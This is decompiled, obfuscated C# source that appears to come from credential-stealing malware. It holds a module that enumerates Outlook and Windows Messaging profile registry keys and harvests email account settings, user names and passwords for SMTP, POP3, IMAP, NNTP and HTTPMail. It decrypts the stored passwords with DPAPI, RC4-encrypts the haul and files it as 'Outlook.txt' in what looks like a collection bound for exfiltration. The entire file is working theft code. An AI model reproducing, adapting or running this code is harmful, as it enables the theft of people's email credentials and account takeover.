using System;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x0200004F RID: 79
	internal class Class_56
	{
		// Token: 0x0600015E RID: 350 RVA: 0x0000DAA8 File Offset: 0x0000BCA8
		public static void gmethod_153(string str_0)
		{
			string text = "";
			string[] array = new string[]
			{
				"Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
				"Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
				"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
				"Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"
			};
			string[] strDizi_ = new string[]
			{
				"SMTP Email Address",
				"SMTP Server",
				"POP3 Server",
				"POP3 User Name",
				"SMTP User Name",
				"NNTP Email Address",
				"NNTP User Name",
				"NNTP Server",
				"IMAP Server",
				"IMAP User Name",
				"Email",
				"HTTP User",
				"HTTP Server URL",
				"POP3 User",
				"IMAP User",
				"HTTPMail User Name",
				"HTTPMail Server",
				"SMTP User",
				"POP3 Password2",
				"IMAP Password2",
				"NNTP Password2",
				"HTTPMail Password2",
				"SMTP Password2",
				"POP3 Password",
				"IMAP Password",
				"NNTP Password",
				"HTTPMail Password",
				"SMTP Password"
			};
			foreach (string str_ in array)
			{
				text += Class_56.cmethod_154(str_, strDizi_);
			}
			try
			{
				if (text != "")
				{
					Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_0 + Class_56.field_0 + "\\Outlook.txt", Class_47.RC4(Encoding.UTF8.GetBytes(text + "\r\n")));
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600015F RID: 351 RVA: 0x0000DC7C File Offset: 0x0000BE7C
		private static string cmethod_154(string str_0, string[] strDizi_0)
		{
			Regex regex = new Regex("^(?!:\\/\\/)([a-zA-Z0-9-_]+\\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\\.[a-zA-Z]{2,11}?$");
			Regex regex2 = new Regex("^([a-zA-Z0-9_\\-\\.]+)@([a-zA-Z0-9_\\-\\.]+)\\.([a-zA-Z]{2,5})$");
			string text = "";
			try
			{
				foreach (string text2 in strDizi_0)
				{
					try
					{
						object obj = Class_56.vmethod_155(str_0, text2);
						if (obj != null && text2.Contains("Password") && !text2.Contains("2"))
						{
							text = string.Concat(new string[]
							{
								text,
								text2,
								": ",
								Class_56.dmethod_156((byte[])obj),
								"\r\n"
							});
						}
						else if (regex.IsMatch(obj.ToString()) || regex2.IsMatch(obj.ToString()))
						{
							text += string.Format("{0}: {1}\r\n", text2, obj);
						}
						else
						{
							text = string.Concat(new string[]
							{
								text,
								text2,
								": ",
								Encoding.UTF8.GetString((byte[])obj).Replace(Convert.ToChar(0).ToString(), ""),
								"\r\n"
							});
						}
					}
					catch
					{
					}
				}
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(str_0, false);
				if (registryKey != null)
				{
					foreach (string str in registryKey.GetSubKeyNames())
					{
						text += Class_56.cmethod_154(str_0 + "\\" + str, strDizi_0);
					}
				}
			}
			catch
			{
			}
			return text;
		}

		// Token: 0x06000160 RID: 352 RVA: 0x0000DE70 File Offset: 0x0000C070
		public static object vmethod_155(string str_0, string str_1)
		{
			object result = null;
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(str_0, false);
				if (registryKey != null)
				{
					result = registryKey.GetValue(str_1);
					registryKey.Close();
				}
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x06000161 RID: 353 RVA: 0x0000DEC4 File Offset: 0x0000C0C4
		public static string dmethod_156(byte[] byteDizi_0)
		{
			try
			{
				byte[] array = new byte[byteDizi_0.Length - 1];
				Buffer.BlockCopy(byteDizi_0, 1, array, 0, byteDizi_0.Length - 1);
				return Encoding.UTF8.GetString(ProtectedData.Unprotect(array, null, DataProtectionScope.CurrentUser)).Replace(Convert.ToChar(0).ToString(), "");
			}
			catch
			{
			}
			return "null";
		}

		// Token: 0x040000F2 RID: 242
		public static string field_0 = "\\EmailClients\\Outlook";
	}
}
